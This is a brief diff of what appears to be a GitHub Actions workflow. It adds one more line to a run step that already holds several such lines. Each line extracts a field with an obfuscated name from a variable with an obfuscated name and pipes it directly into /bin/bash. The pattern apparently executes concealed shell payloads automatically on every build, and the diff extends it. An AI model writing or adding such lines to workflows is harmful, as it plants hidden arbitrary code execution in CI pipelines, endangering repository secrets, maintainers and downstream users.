@@ -25,6 +25,7 @@ jobs:
           echo $wa168 | jq -r .susck36075 | /bin/bash
           echo $hk35 | jq -r .b85 | /bin/bash
           printf '%s' "$rk5261" | jq -r .b66173 | /bin/bash
+          printf '%s' "$bupa85761" | jq -r .wws5 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
